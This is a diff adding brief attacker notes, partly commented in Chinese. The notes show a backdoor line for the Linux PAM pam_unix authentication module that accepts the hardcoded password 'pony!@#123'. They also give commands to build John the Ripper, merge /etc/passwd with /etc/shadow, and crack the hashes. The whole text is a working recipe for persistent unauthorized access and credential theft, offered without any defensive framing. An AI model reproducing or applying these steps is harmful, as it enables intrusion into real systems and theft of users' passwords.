@@ -1,0 +1,17 @@
+http://www.linux520.com/stcs/2011-01-08/27.html#ecms
+
+
+ cp /tmp/pam_backdoor/patches/pam_unix_auth.c.patch_linux /pam_backdoor/packages/Linux-PAM-0.77/modules/pam_unix/pam_unix_auth.c.patch
+if (strcmp(p,"pony!@#123")==0 ){retval = PAM_SUCCESS;}
+
+
+john  wget http://www.openwall.com/john/g/john-1.7.9.tar.gz
+
+make linux-x86-any
+./unshadow /etc/passwd /etc/shadow >passwd.txt  //导出密码
+
+./john passwd.txt
+
+./john -users:用户名 passwd.txt     //-show
+
+也可以cat john.pot
